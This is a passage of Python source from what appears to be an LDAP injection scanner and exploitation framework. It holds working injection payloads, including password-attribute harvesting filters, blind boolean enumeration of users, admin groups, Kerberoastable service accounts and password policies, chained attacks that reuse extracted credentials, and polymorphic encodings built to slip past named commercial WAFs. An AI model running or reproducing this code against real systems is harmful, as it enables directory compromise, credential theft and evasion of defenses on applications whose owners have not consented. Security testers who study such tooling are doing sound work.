        or_parts = "".join(f"({a}=*)" for a in attrs[:5])
        result.append(Payload(
            raw       = f"*(|{or_parts})",
            desc      = "CTX: multi-attr OR bypass",
            technique = "or_chain",
            tier      = PayloadTier.TIER1_CORE,
            priority  = 9,
        ))

        # 3. Group membership probes from hinted group names
        for grp in self._groups[:4]:
            safe_grp = re.sub(r"[^a-zA-Z0-9 _-]", "", grp)[:40]
            if not safe_grp:
                continue
            attr = "memberOf" if self._stype == "ad" else "member"
            result.append(Payload(
                raw       = f"*({attr}=*{safe_grp}*)",
                desc      = f"CTX: group membership probe ({safe_grp!r})",
                technique = "group_enum",
                tier      = PayloadTier.TIER1_CORE,
                priority  = 7,
            ))

        # 4. DN-based injection if base_dn known
        if self._base_dn:
            safe_dn = self._base_dn[:80]
            result.append(Payload(
                raw       = f"*)(dn={safe_dn}",
                desc      = f"CTX: DN injection ({safe_dn!r})",
                technique = "dn_inject",
                tier      = PayloadTier.TIER1_CORE,
                priority  = 8,
            ))

        # 5. Password attribute probes (server-aware)
        pw_attr = "unicodePwd" if self._stype == "ad" else "userPassword"
        result.append(Payload(
            raw       = f"*)(|({pw_attr}=*)",
            desc      = f"CTX: password attr harvest ({pw_attr})",
            technique = "attr_harvest",
            tier      = PayloadTier.TIER1_CORE,
            priority  = 9,
        ))

        self._payloads = result
        self._built    = True
        vprint(f"  [ContextPayloads] Built {len(result)} target-aware payloads "
               f"(server={self._stype}, attrs={len(attrs)})")
        return result

    @staticmethod
    def extract_group_hints(html: str) -> List[str]:
        """Scrape plausible group/role names from an HTML page."""
        candidates: List[str] = []
        # Role/group-looking <option> values
        for m in re.finditer(
            r'<option[^>]*value=["\']([^"\']{3,40})["\']',
            html, re.I
        ):
            v = m.group(1).strip()
            if re.match(r'^[a-zA-Z0-9 _-]+$', v):
                candidates.append(v)
        # aria-label / data-role attributes
        for m in re.finditer(
            r'(?:data-role|aria-label|data-group)=["\']([^"\']{3,40})["\']',
            html, re.I
        ):
            v = m.group(1).strip()
            if re.match(r'^[a-zA-Z0-9 _-]+$', v):
                candidates.append(v)
        return list(dict.fromkeys(candidates))[:10]


# ═══════════════════════════════════════════════════════════════════════════════
# §V6-E  LDAP SCHEMA & DIRECTORY ENUMERATOR
# ═══════════════════════════════════════════════════════════════════════════════

class LDAPSchemaEnumerator:
    """
    V6 Enhancement #6 — Fine-grained post-confirm enumeration.

    After a CONFIRMED injection is found, this class drives blind boolean
    queries to enumerate:

    • User accounts (uid / sAMAccountName values)
    • Group names and memberships
    • Operational attributes (passwordExpirationTime, lockout flags)
    • ACL hints (e.g. which attributes return data vs empty)

    All queries use the confirmed boolean oracle channel so no extra
    injection vector is needed.
    """

    _USER_ATTRS_AD = [
        "sAMAccountName","userPrincipalName","displayName","mail",
        "memberOf","userAccountControl","pwdLastSet","lastLogon",
        "description","distinguishedName",
    ]
    _USER_ATTRS_OL = [
        "uid","cn","mail","sn","givenName","uidNumber","gidNumber",
        "homeDirectory","loginShell","shadowExpire","shadowLastChange",
        "description","telephoneNumber",
    ]
    _COMMON_USERNAMES = [
        "admin","administrator","root","service","ldap","guest","test",
        "user","operator","backup","readonly","svc","system","support",
        "webadmin","dbadmin","deploy","ansible","gitlab","jenkins",
    ]

    def __init__(
        self,
        client:    "HTTPClient",
        pipeline:  "DetectionPipeline",
        budget:    "AdaptiveBudgetManager",
        cfg:       "ScanConfig",
        extractor: "BlindAttributeExtractor",
    ) -> None:
        self._client    = client
        self._pipeline  = pipeline
        self._budget    = budget
        self._cfg       = cfg
        self._extractor = extractor

    # ── Oracle primitive ──────────────────────────────────────────────────────

    def _oracle(
        self,
        ep:       "Endpoint",
        param:    str,
        filter_:  str,
        baseline: "Baseline",
    ) -> bool:
        """Return True if the LDAP filter matches (boolean oracle fires)."""
        pl = Payload(
            raw       = filter_,
            desc      = "enum oracle",
            technique = "bool_true",
            tier      = PayloadTier.TIER2_BOOLEAN,
        )
        data = build_injection_data(
            ep, param, pl.raw, self._cfg.deterministic_suffix)
        resp = self._client.send_endpoint(ep, data, phase="verification")
        if resp is None:
            return False
        result = self._pipeline.run(resp, baseline, pl)
        return result.fired

    # ── User enumeration ──────────────────────────────────────────────────────

    def enumerate_users(
        self,
        ep:       "Endpoint",
        param:    str,
        baseline: "Baseline",
        server_type: str = "generic",
    ) -> List[str]:
        """
        Boolean-enumerate common usernames from the directory.
        Uses both prefix probe and exact existence check.
        """
        attr     = "sAMAccountName" if server_type == "ad" else "uid"
        found:   List[str] = []
        limit    = min(self._cfg.enum_max_users, 50)
        userlist = list(self._COMMON_USERNAMES)

        # Extra attrs from config
        if self._cfg.enum_attrs:
            userlist = self._cfg.enum_attrs + userlist

        for username in userlist:
            if len(found) >= limit:
                break
            if not self._budget.acquire_for_phase("verification"):
                break
            filter_ = f"*({attr}={username})"
            exists  = self._oracle(ep, param, filter_, baseline)
            if exists:
                found.append(username)
                info(f"    [Enum] User confirmed: {username!r}")

        return found

    # ── Attribute presence scan ───────────────────────────────────────────────

    def probe_attribute_acl(
        self,
        ep:       "Endpoint",
        param:    str,
        baseline: "Baseline",
        server_type: str = "generic",
    ) -> Dict[str, bool]:
        """
        Probe which attributes return results (not ACL-blocked).
        Returns {attr_name: readable}.
        """
        attrs = (
            self._USER_ATTRS_AD
            if server_type == "ad"
            else self._USER_ATTRS_OL
        )
        readable: Dict[str, bool] = {}
        for attr in attrs:
            if not self._budget.acquire_for_phase("verification"):
                break
            filter_ = f"*({attr}=*)"
            is_readable = self._oracle(ep, param, filter_, baseline)
            readable[attr] = is_readable
            vprint(f"  [ACL probe] {attr}: {'READABLE' if is_readable else 'BLOCKED/EMPTY'}")
        return readable

    # ── Group enumeration ─────────────────────────────────────────────────────

    def enumerate_groups(
        self,
        ep:       "Endpoint",
        param:    str,
        baseline: "Baseline",
        server_type: str = "generic",
    ) -> List[str]:
        """Enumerate common group names using boolean oracle."""
        common_groups = [
            "Domain Admins","Domain Users","Enterprise Admins","Administrators",
            "Schema Admins","Group Policy Creator Owners","Remote Desktop Users",
            "admin","users","wheel","sudo","staff","developers","devops",
            "operations","security","network","dba","it","helpdesk",
        ]
        attr   = "cn"
        found: List[str] = []

        for grp in common_groups:
            if not self._budget.acquire_for_phase("verification"):
                break
            filter_ = f"*({attr}={grp})"
            if self._oracle(ep, param, filter_, baseline):
                found.append(grp)
                info(f"    [Enum] Group confirmed: {grp!r}")

        return found

    # ── High-level enumeration orchestrator ───────────────────────────────────

    def run(
        self,
        ep:          "Endpoint",
        param:       str,
        baseline:    "Baseline",
        server_type: str = "generic",
    ) -> Dict[str, Any]:
        """
        Run full post-confirm enumeration.
        Returns a structured dict suitable for exploiter_context.
        """
        phase(f"Post-confirm enumeration: {ep.url}:{param}")
        result: Dict[str, Any] = {
            "users":   [],
            "groups":  [],
            "acl_map": {},
            "extracted_values": {},
        }

        # 1. ACL probe (cheap — tells us what's readable)
        result["acl_map"] = self.probe_attribute_acl(ep, param, baseline, server_type)
        readable_attrs = [a for a, r in result["acl_map"].items() if r]

        # 2. User enumeration
        result["users"] = self.enumerate_users(ep, param, baseline, server_type)

        # 3. Group enumeration
        result["groups"] = self.enumerate_groups(ep, param, baseline, server_type)

        # 4. Blind attribute extraction for readable attrs
        if readable_attrs and not self._cfg.no_extract:
            vals = self._extractor.extract_all(ep, param, baseline, readable_attrs[:6])
            result["extracted_values"] = vals

        info(
            f"    [Enum] Complete: {len(result['users'])} users, "
            f"{len(result['groups'])} groups, "
            f"{len(readable_attrs)} readable attrs"
        )
        return result


class ExploitStateTracker:
    """
    V6: Stateful exploitation tracker for chained/second-order attacks.

    Maintains per-endpoint injection state across multiple requests:
      - Successful payload context (cookies, tokens, session state)
      - Injection markers injected and awaiting delayed reflection
      - Cross-endpoint correlation (inject endpoint A → trigger via endpoint B)
      - Auth session tokens harvested via boolean extraction

    This enables:
      1. Second-order injection: inject a payload that gets stored and later
         executed when another user/process accesses it.
      2. Delayed-trigger exploitation: inject filter, wait, probe.
      3. Chained auth: use extracted credentials to re-authenticate and
         reach deeper endpoints.
    """

    @dataclass
    class InjectedState:
        endpoint_url:   str
        parameter:      str
        payload_raw:    str
        technique:      str
        timestamp:      str
        session_cookies: Dict[str, str] = field(default_factory=dict)
        csrf_tokens:    Dict[str, str]  = field(default_factory=dict)
        marker:         str             = ""
        triggered:      bool            = False
        trigger_resp_class: str         = ""

    def __init__(self, cfg: ScanConfig):
        self._cfg    = cfg
        self._states: List["ExploitStateTracker.InjectedState"] = []
        self._lock   = threading.Lock()
        # Extracted credentials from blind extraction (param → value)
        self._extracted: Dict[str, str] = {}
        # Endpoints confirmed injectable (url → [params])
        self._injectable_eps: Dict[str, List[str]] = {}

    def record_injection(self, ep: Endpoint, param: str,
                         payload_raw: str, technique: str,
                         session_cookies: Optional[Dict[str, str]] = None,
                         csrf_tokens: Optional[Dict[str, str]] = None) -> str:
        """
        Record a successful injection for deferred triggering.
        Returns a unique marker string embedded in the payload.
        """
        marker = f"HH_{self._cfg.scan_id[:6]}_{uuid.uuid4().hex[:6]}"
        state  = self.InjectedState(
            endpoint_url    = ep.url,
            parameter       = param,
            payload_raw     = payload_raw,
            technique       = technique,
            timestamp       = now_iso(),
            session_cookies = session_cookies or {},
            csrf_tokens     = csrf_tokens or {},
            marker          = marker,
        )
        with self._lock:
            self._states.append(state)
            self._injectable_eps.setdefault(ep.url, [])
            if param not in self._injectable_eps[ep.url]:
                self._injectable_eps[ep.url].append(param)
        return marker

    def record_extracted_value(self, attr: str, value: str) -> None:
        with self._lock:
            self._extracted[attr] = value

    def get_extracted(self) -> Dict[str, str]:
        with self._lock:
            return dict(self._extracted)

    def get_injectable_endpoints(self) -> Dict[str, List[str]]:
        with self._lock:
            return dict(self._injectable_eps)

    def probe_deferred_triggers(
        self,
        client: HTTPClient,
        pipeline: DetectionPipeline,
        baselines: Dict[str, Baseline],
        delay: float = 1.0
    ) -> List[Dict[str, Any]]:
        """
        Re-probe all recorded injection states after a configurable delay.
        Used to detect second-order reflections (stored injections).
        Returns list of triggered state dicts.
        """
        triggered: List[Dict[str, Any]] = []
        if not self._states:
            return triggered

        time.sleep(delay)

        with self._lock:
            pending = [s for s in self._states if not s.triggered]

        for state in pending:
            # Find a baseline for this endpoint
            bl: Optional[Baseline] = None
            for k, b in baselines.items():
                if state.endpoint_url in k:
                    bl = b
                    break
            if bl is None:
                continue

            # Re-probe: send a benign wildcard to see if stored marker reflects
            probe_ep = Endpoint(
                url=state.endpoint_url, method="GET",
                params=[state.parameter], source="state_probe",
            )
            probe_data = build_injection_data(probe_ep, state.parameter, "*",
                                              self._cfg.deterministic_suffix)
            resp = client.send_endpoint(probe_ep, probe_data, phase="injection")
            if resp is None:
                continue

            body = resp.text or ""
            if state.marker in body:
                dummy_pl = Payload(state.payload_raw, "deferred",
                                   state.technique, PayloadTier.TIER6_SECOND_ORDER)
                det = pipeline.run(resp, bl, dummy_pl)
                if det.fired or LDAP_FILTER_REFLECT_RE.search(body) or LDAP_ERRORS_RE.search(body):
                    with self._lock:
                        state.triggered = True
                        state.trigger_resp_class = det.response_class
                    triggered.append({
                        "endpoint_url": state.endpoint_url,
                        "parameter":    state.parameter,
                        "marker":       state.marker,
                        "technique":    state.technique,
                        "det_score":    det.score,
                        "timestamp":    now_iso(),
                    })
                    finding(f"  [STATE] Deferred injection triggered: "
                            f"{state.endpoint_url}:{state.parameter} marker={state.marker}")

        return triggered

    def build_chained_payloads(
        self,
        extracted: Dict[str, str],
        server_type: str = "generic"
    ) -> List[Payload]:
        """
        Build context-aware payloads seeded from previously extracted attribute values.
        E.g., if uid="jsmith" was extracted, generate payloads targeting that user.
        """
        payloads: List[Payload] = []
        uid = extracted.get("uid") or extracted.get("sAMAccountName", "")
        mail = extracted.get("mail", "")
        cn   = extracted.get("cn", "")

        if uid:
            payloads += [
                Payload(f"*(uid={uid})(|(uid=*)",
                        f"Chained: uid={uid} OR bypass",
                        "chain_uid_or", PayloadTier.TIER1_CORE, 10),
                Payload(f"*(|(uid={uid})(uid=admin))",
                        f"Chained: uid={uid} admin equivalence",
                        "chain_uid_admin", PayloadTier.TIER1_CORE, 9),
            ]
        if mail:
            payloads.append(Payload(
                f"*(mail={mail})(|(mail=*)",
                f"Chained: mail={mail} OR bypass",
                "chain_mail_or", PayloadTier.TIER1_CORE, 8))
        if cn:
            payloads.append(Payload(
                f"*(cn={cn})(objectClass=*)",
                f"Chained: cn={cn} objectClass probe",
                "chain_cn_probe", PayloadTier.TIER1_CORE, 8))

        # Server-specific chain payloads
        if server_type == "ad" and uid:
            payloads.append(Payload(
                f"*(sAMAccountName={uid})(adminCount=1)",
                f"Chained AD: {uid} admin flag check",
                "chain_ad_admin", PayloadTier.TIER1_CORE, 9, "any", "ad"))

        return payloads


class PolymorphicPayloadGenerator:
    """
    V6: Dynamic WAF bypass via polymorphic payload generation.

    Generates context-aware mutations that actively evade:
      - Regex WAF signatures (via structural character substitution)
      - Length-based filters (via comment/whitespace injection)
      - Content normalisation (via multi-encoding stacking)
      - Request-level inspection (via header smuggling variants)

    Unlike the static Tier5 list, these are generated at scan-time
    from the survived metacharacter set and the detected WAF profile.
    """

    @staticmethod
    def _hex_structural(text: str) -> str:
        """Hex-encode only LDAP structural chars — avoids triggering plaintext sig."""
        return "".join(f"\\{ord(c):02x}" if c in "()=*|&\\" else c for c in text)

    @staticmethod
    def _hex_structural_upper(text: str) -> str:
        return "".join(f"\\{ord(c):02X}" if c in "()=*|&\\" else c for c in text)

    @staticmethod
    def _ws_pad(text: str) -> str:
        """Insert tab after open paren — some parsers accept it, WAFs miss it."""
        return text.replace("(", "(\t").replace("=", " = ")

    @staticmethod
    def _null_pre_special(text: str) -> str:
        """Insert %00 before structural chars — truncation bypass heuristic."""
        return re.sub(r'([()=*|&\\])', r'%00\1', text)

    @staticmethod
    def _random_case_attrs(text: str) -> str:
        """Randomly case LDAP attribute names to defeat regex WAF signatures."""
        def _mutate(m: "re.Match") -> str:
            return "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in m.group(0)
            )
        return re.sub(r'[a-zA-Z]{3,}', _mutate, text)

    @staticmethod
    def _insert_newline_eq(text: str) -> str:
        return text.replace("=", "=\n", 1)

    @staticmethod
    def _double_url_structural(text: str) -> str:
        rep = {"(": "%2528", ")": "%2529", "*": "%252a",
               "=": "%253d", "|": "%257c", "&": "%2526"}
        return "".join(rep.get(c, c) for c in text)

    @staticmethod
    def _unicode_fullwidth(text: str) -> str:
        return "".join(chr(ord(c)+0xFEE0) if 0x21<=ord(c)<=0x7E else c for c in text)

    @classmethod
    def generate(cls, base_payload: Payload, survived: Set[str],
                 waf_name: str = "Generic", rounds: int = 8) -> List[Payload]:
        """
        Generate up to `rounds` polymorphic bypass variants.
        Strategies are prioritised based on detected WAF profile.
        """
        raw = base_payload.raw
        variants: List[Payload] = []
        seen: Set[str] = {raw}

        # Strategy table: (name, fn)
        base_strategies = [
            ("hex_struct",     cls._hex_structural),
            ("hex_upper",      cls._hex_structural_upper),
            ("ws_pad",         cls._ws_pad),
            ("nl_eq",          cls._insert_newline_eq),
            ("rand_case",      cls._random_case_attrs),
            ("null_special",   cls._null_pre_special),
            ("url_full",       lambda s: quote(s, safe="")),
            ("dbl_url",        lambda s: quote(quote(s, safe=""), safe="")),
            ("dbl_url_struct", cls._double_url_structural),
        ]

        # Cloud/enterprise WAFs: prepend aggressive unicode tricks
        if waf_name.lower() in ("cloudflare", "akamai", "imperva", "aws_waf"):
            strategies = [
                ("unicode_fw", cls._unicode_fullwidth),
                ("cf_dbl_hex", lambda s: "".join(
                    f"%{ord(c):02x}" if c in "()=*|&\\"
                    else c for c in quote(s, safe=""))),
                ("cf_null_mid", lambda s: s[:len(s)//2] + "\x00" + s[len(s)//2:]),
            ] + base_strategies
        else:
            strategies = base_strategies

        for name, fn in strategies[:rounds]:
            try:
                mutated = fn(raw)
                if mutated and mutated != raw and mutated not in seen:
                    specials = {c for c in mutated if c in LDAP_METACHAR_SET}
                    if not specials or specials.issubset(survived):
                        seen.add(mutated)
                        variants.append(Payload(
                            raw=mutated,
                            desc=f"POLY-{name}: {base_payload.desc}",
                            technique=f"{base_payload.technique}_{name}",
                            tier=PayloadTier.TIER5_MUTATION,
                            priority=base_payload.priority - 1,
                        ))
            except Exception:
                pass

        return variants

    @staticmethod
    def header_injection_variants(payload: str) -> Dict[str, str]:
        """
        Generate HTTP header injection variants.
        These headers are commonly forwarded into LDAP filters by proxies/apps.
        """
        return {
            "X-Forwarded-For":     payload,
            "X-Real-IP":           payload,
            "X-Auth-User":         payload,
            "X-Remote-User":       payload,
            "X-Username":          payload,
            "X-LDAP-Filter":       payload,
            "Proxy-Authorization": f"Basic {quote(payload, safe='')}",
        }


class DirectorySchemaProbe:
    """
    V6: Target-aware schema discovery for context-sensitive payload generation.

    Probes the target application to determine which LDAP attributes and
    object classes are active in the directory, then synthesises environment-
    specific payloads that are far more effective than generic pre-baked lists.
    """

    _PROBE_ATTRS_GENERIC = [
        "uid", "cn", "sAMAccountName", "mail", "userPassword",
        "userPrincipalName", "memberOf", "objectClass",
        "givenName", "sn", "telephoneNumber", "department",
        "unixHomeDirectory", "loginShell", "uidNumber", "gidNumber",
        "sshPublicKey", "description",
    ]
    _PROBE_ATTRS_AD = [
        "sAMAccountName", "userPrincipalName", "objectSid", "memberOf",
        "adminCount", "servicePrincipalName", "userAccountControl",
        "pwdLastSet", "badPasswordCount", "lastLogon",
        "msDS-AllowedToActOnBehalfOfOtherIdentity",
        "msDS-SupportedEncryptionTypes",
    ]
    _PROBE_OBJECT_CLASSES = [
        "person", "user", "inetOrgPerson", "organizationalPerson",
        "posixAccount", "shadowAccount", "computer", "group",
        "groupOfNames", "posixGroup",
    ]

    def __init__(self, client: HTTPClient, pipeline: DetectionPipeline,
                 budget: AdaptiveBudgetManager, cfg: ScanConfig):
        self._client   = client
        self._pipeline = pipeline
        self._budget   = budget
        self._cfg      = cfg

    def discover(self, ep: Endpoint, param: str,
                 baseline: Baseline, server_type: str = "generic") -> Dict[str, Any]:
        """
        Run boolean-based schema discovery against a confirmed injectable param.
        Returns dict: {attributes, object_classes, naming_attr, payloads}.
        """
        report: Dict[str, Any] = {
            "attributes":     [],
            "object_classes": [],
            "naming_attr":    "uid",
            "payloads":       [],
        }

        attr_set = (self._PROBE_ATTRS_AD if server_type == "ad"
                    else self._PROBE_ATTRS_GENERIC)

        active_attrs: List[str] = []
        for attr in attr_set:
            if not self._budget.acquire_for_phase("verification"):
                break
            if self._bool_probe(ep, param, f"*({attr}=*)", baseline):
                active_attrs.append(attr)
                verbose(f"    [Schema] attr [{attr}] present")
        report["attributes"] = active_attrs

        active_oc: List[str] = []
        for oc in self._PROBE_OBJECT_CLASSES:
            if not self._budget.acquire_for_phase("verification"):
                break
            if self._bool_probe(ep, param, f"*(objectClass={oc})", baseline):
                active_oc.append(oc)
                verbose(f"    [Schema] objectClass [{oc}] present")
        report["object_classes"] = active_oc

        for naming_candidate in ["sAMAccountName", "uid", "cn", "mail"]:
            if naming_candidate in active_attrs:
                report["naming_attr"] = naming_candidate
                break

        report["payloads"] = self._schema_payloads(
            active_attrs, active_oc, report["naming_attr"], server_type)
        info(f"  Schema probe: {len(active_attrs)} attrs, "
             f"{len(active_oc)} obj-classes, naming={report['naming_attr']}")
        return report

    def _bool_probe(self, ep: Endpoint, param: str,
                    filter_str: str, baseline: Baseline) -> bool:
        pl = Payload(raw=filter_str, desc="schema-probe",
                     technique="bool_enum", tier=PayloadTier.TIER2_BOOLEAN)
        data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
        resp = self._client.send_endpoint(ep, data, phase="verification")
        if resp is None:
            return False
        return self._pipeline.run(resp, baseline, pl).fired

    def _schema_payloads(self, active_attrs: List[str], active_oc: List[str],
                         naming_attr: str, server_type: str) -> List[Payload]:
        payloads: List[Payload] = []
        if active_attrs:
            clause = "".join(f"({a}=*)" for a in active_attrs[:8])
            payloads.append(Payload(
                raw=f"*(|{clause})",
                desc=f"Schema OR bypass ({len(active_attrs)} attrs)",
                technique="schema_bypass", tier=PayloadTier.TIER1_CORE, priority=10))
        if naming_attr:
            payloads += [
                Payload(f"*({naming_attr}=*)",
                        f"Schema naming wildcard ({naming_attr})",
                        "schema_naming", PayloadTier.TIER1_CORE, 10),
                Payload(f"admin)({naming_attr}=*)(x=",
                        f"Schema naming bypass (admin)",
                        "schema_naming_bypass", PayloadTier.TIER1_CORE, 9),
            ]
        sensitive = [a for a in active_attrs if a in (
            "userPassword", "unicodePwd", "shadowPassword",
            "servicePrincipalName",
            "msDS-AllowedToActOnBehalfOfOtherIdentity")]
        if sensitive:
            clause = "".join(f"({s}=*)" for s in sensitive)
            payloads.append(Payload(
                raw=f"*(|{clause})",
                desc=f"Schema sensitive attrs ({', '.join(sensitive[:3])})",
                technique="schema_sensitive", tier=PayloadTier.TIER1_CORE, priority=9))
        return payloads


class LDAPEnumerationEngine:
    """
    V6: Post-confirmation LDAP enumeration via web injection oracle.

    After a CONFIRMED finding, systematically maps the directory by probing
    boolean filters for users, groups, password policies, and service accounts.
    Results are attached to the HandoffFinding exploiter_context block.
    """

    _USER_PROBES = [
        ("all_persons",          "*(objectClass=person)"),
        ("uid_admin",            "*(|(uid=admin)(uid=administrator)(uid=root)(uid=sysadmin))"),
        ("sam_admin",            "*(|(sAMAccountName=Admin*)(sAMAccountName=administrator))"),
        ("service_accounts",     "*(servicePrincipalName=*)"),
        ("ad_disabled",          "*(userAccountControl:1.2.840.113556.1.4.803:=2)"),
        ("ad_no_pwd_req",        "*(userAccountControl:1.2.840.113556.1.4.803:=32)"),
        ("ad_pwd_never_expire",  "*(userAccountControl:1.2.840.113556.1.4.803:=65536)"),
        ("ad_kerberoastable",    "*(servicePrincipalName=*)"),
        ("unix_users",           "*(|(uidNumber=*)(objectClass=posixAccount))"),
        ("ssh_key_users",        "*(sshPublicKey=*)"),
        ("sudo_users",           "*(objectClass=sudoRole)"),
    ]
    _GROUP_PROBES = [
        ("all_groups",        "*(|(objectClass=group)(objectClass=posixGroup)(objectClass=groupOfNames))"),
        ("domain_admins",     "*(|(cn=Domain Admins)(cn=Administrators)(cn=Admin*))"),
        ("enterprise_admins", "*(|(cn=Enterprise Admins)(cn=Schema Admins)(cn=Backup Operators))"),
        ("remote_access",     "*(|(cn=VPN*)(cn=Remote*)(cn=RDP*))"),
    ]
    _POLICY_PROBES = {
        "ad": [
            ("ppolicy_present",   "*(|(msDS-LockoutThreshold=*)(lockoutThreshold=*))"),
            ("fine_grained_pwd",  "*(msDS-PasswordSettingsPrecedence=*)"),
            ("krb5_config",       "*(objectClass=krb5RealmConfig)"),
        ],
        "generic": [
            ("ppolicy_present",  "*(objectClass=pwdPolicy)"),
            ("shadow_accounts",  "*(objectClass=shadowAccount)"),
            ("pwd_min_age",      "*(pwdMinAge=*)"),
        ],
    }

    def __init__(self, client: HTTPClient, pipeline: DetectionPipeline,
                 budget: AdaptiveBudgetManager, cfg: ScanConfig):
        self._client   = client
        self._pipeline = pipeline
        self._budget   = budget
        self._cfg      = cfg

    def enumerate(self, ep: Endpoint, param: str,
                  baseline: Baseline, server_type: str = "generic") -> Dict[str, Any]:
        """Run full enumeration suite. Returns structured results dict."""
        results: Dict[str, Any] = {
            "users":       {},
            "groups":      {},
            "policy":      {},
            "enumerated_at": now_iso(),
            "server_type": server_type,
        }

        info(f"  [Enum] Starting LDAP enumeration on {ep.url}:{param}")

        for name, filt in self._USER_PROBES:
            if not self._budget.acquire_for_phase("verification"):
                break
            results["users"][name] = self._probe(ep, param, filt, baseline)

        for name, filt in self._GROUP_PROBES:
            if not self._budget.acquire_for_phase("verification"):
                break
            results["groups"][name] = self._probe(ep, param, filt, baseline)

        for name, filt in self._POLICY_PROBES.get(server_type,
                                                   self._POLICY_PROBES["generic"]):
            if not self._budget.acquire_for_phase("verification"):
                break
            results["policy"][name] = self._probe(ep, param, filt, baseline)

        positives_users  = sum(1 for v in results["users"].values()  if v)
        positives_groups = sum(1 for v in results["groups"].values() if v)
        info(f"  [Enum] users={positives_users}/{len(self._USER_PROBES)} "
             f"groups={positives_groups}/{len(self._GROUP_PROBES)} TRUE")
        return results

    def _probe(self, ep: Endpoint, param: str,
               filter_str: str, baseline: Baseline) -> bool:
        pl   = Payload(raw=filter_str, desc="enum",
                       technique="bool_enum", tier=PayloadTier.TIER2_BOOLEAN)
        data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
        resp = self._client.send_endpoint(ep, data, phase="verification")
        if resp is None:
            return False
        return self._pipeline.run(resp, baseline, pl).fired


class InjectionEngine:
    """
    Core injection loop with Tier 0 gating and dual-state support.

    For each endpoint:
      1. Run Tier 0 probes (3 requests, free budget)
         → If no signal: mark CANDIDATE, skip full injection
         → If signal: proceed to Tier 1

      2. Run Tier 1 payloads (up to 8, EMA-ordered)
         → Detection pipeline per response
         → On signal: dispatch to FP filter + Verifier (concurrent)

      3. On WAF detection: generate Tier 3 variants from trigger payload

      4. On boolean signal needed: run Tier 2 paired probes

      5. On collab configured: append Tier 4 OOB payloads

    Verification runs concurrently in VerificationPool.
    Main loop continues scanning next endpoint immediately.
    """

    def __init__(self, cfg: ScanConfig,
                 client: HTTPClient,
                 budget: AdaptiveBudgetManager,
                 memory: LearningMemory,
                 pipeline: DetectionPipeline,
                 verifier: ThreeStepVerifier,
                 fp_filter: FalsePositiveFilter,
                 oob: Optional[OOBListener],
                 baselines: Dict[str, Baseline],
                 logger: ScanSessionLogger,
                 # V6 components (optional — injected by orchestrator)
                 state_tracker:   Optional[ExploitStateTracker]         = None,
                 poly_gen:        Optional[PolymorphicPayloadGenerator]  = None,
                 poly_gen_ema:    Optional["PolymorphicBypassGenerator"] = None,
                 schema_probe:    Optional[DirectorySchemaProbe]         = None,
                 enum_engine:     Optional[LDAPEnumerationEngine]        = None,
                 ctx_adaptor:     Optional["TargetAwarePayloadAdaptor"]  = None,
                 # V8 components
                 chained_mutator: Optional["ChainedPayloadMutator"]      = None,
                 cp_memory:       Optional["ControlPlaneMemory"]          = None,
                 ):
        self._cfg      = cfg
        self._client   = client
        self._budget   = budget
        self._memory   = memory
        self._pipeline = pipeline
        self._verifier = verifier
        self._fp       = fp_filter
        self._oob      = oob
        self._baselines= baselines
        self._logger    = logger
        self._fp_count  = 0
        self._sig_count = 0
        self._lock     = threading.Lock()
        # V6 components
        self._state_tracker = state_tracker
        self._poly_gen      = poly_gen      or PolymorphicPayloadGenerator()
        self._poly_gen_ema  = poly_gen_ema   # EMA-learning bypass generator (PolymorphicBypassGenerator)
        self._schema_probe  = schema_probe
        self._enum_engine   = enum_engine
        self._ctx_adaptor   = ctx_adaptor
        # V8 components
        self._chained_mutator = chained_mutator
        self._cp_memory       = cp_memory
        # V11 — Cross-param validator
        self._cross_param_val = CrossParamValidator(client, cfg)
        # V12 — Adaptive payload refiner + target profiler
        self._dpr = DynamicPayloadRefiner(client, pipeline, budget, cfg)
        self._tpe = TargetProfilerEngine(client, pipeline, cfg)
        # Per-endpoint schema cache to avoid re-probing same endpoint
        self._schema_cache: Dict[str, Dict[str, Any]] = {}

    def _get_baseline(self, ep: Endpoint) -> Optional[Baseline]:
        return self._baselines.get(ep.key)


    def _handle_signal(
        self, ep: Endpoint, param: str,
        payload: Payload, baseline: Baseline,
        result: DetectionResult, resp: requests.Response,
        is_header: bool = False,
        server_type: str = "generic",
        framework:   str = "generic"
    ) -> List[HandoffFinding]:
        """Wave 4: Centralized signal handling for params and headers (§7.6)."""
        self._memory.mark_success(ep.url, payload.raw)
        with self._lock:
            self._sig_count += 1

        detect_msg(f"  Signal: {ep.url}:{param} "
                   f"payload={payload.raw[:50]!r} "
                   f"score={result.score:.1f} "
                   f"detectors={[s.detector for s in result.signals]}")

        # Control response for FP filter L3
        if is_header:
            ctrl_resp = self._client.send_header(ep, param, "safe_val", phase="verification")
        else:
            ctrl_data = build_safe_data(ep.params, randomize=True)
            ctrl_resp = self._client.send_endpoint(ep, ctrl_data, phase="verification")
        
        ctrl_body = ctrl_resp.text if ctrl_resp else ""

        # Verification
        if is_header:
            grade = VerificationGrade.CANDIDATE
            v_result = {"grade": grade, "proof": ["Header signal: Manual review recommended"], "step3_hits": 1}
        else:
            v_result = self._verifier.verify(ep, param, payload.raw, baseline)
            grade = v_result["grade"]

        # FP filter (Layers 1-6)
        fp_ok, downgrade, fp_reasons = self._fp.validate(
            ep=ep, param=param, payload=payload,
            baseline=baseline, result=result,
            inj_body=resp.text or "",
            replay_hits=v_result["step3_hits"],
            control_body=ctrl_body,
        )
        if not fp_ok:
            verbose(f"  FP filtered: {fp_reasons[-1] if fp_reasons else 'unknown'}")
            with self._lock:
                self._fp_count += 1
            return []

        if downgrade and grade == VerificationGrade.CONFIRMED:
            grade = VerificationGrade.PROBABLE

        hf = self._build_handoff_finding(
            ep=ep, param=param, pl=payload,
            result=result, grade=grade,
            v_result=v_result,
            server_type=server_type,
            framework=framework,
            inj_body=resp.text or "",
        )
        return [hf]

    def _run_tier1_param(
        self, ep: Endpoint, param: str,
        baseline: Baseline,
        server_type: str, framework: str,
        t0_signals_fired: bool = False
    ) -> Tuple[List[HandoffFinding], List[InconclusiveFinding]]:
        """V12: Run Tier 1 with TargetProfilerEngine + DynamicPayloadRefiner."""
        # V12: Profile target before injection to determine strategy
        tpe_profile = None
        payload_limit = self._cfg.max_payloads_tier1
        try:
            tpe_profile  = self._tpe.profile(ep, param, baseline)
            payload_limit = self._tpe.strategy_payload_limit(tpe_profile)
            vprint(f"  [TPE] {ep.url}:{param} strategy={tpe_profile.strategy} limit={payload_limit}")
        except Exception:
            pass

        payloads = PayloadEngine.build_tier1(
            server_type = server_type,
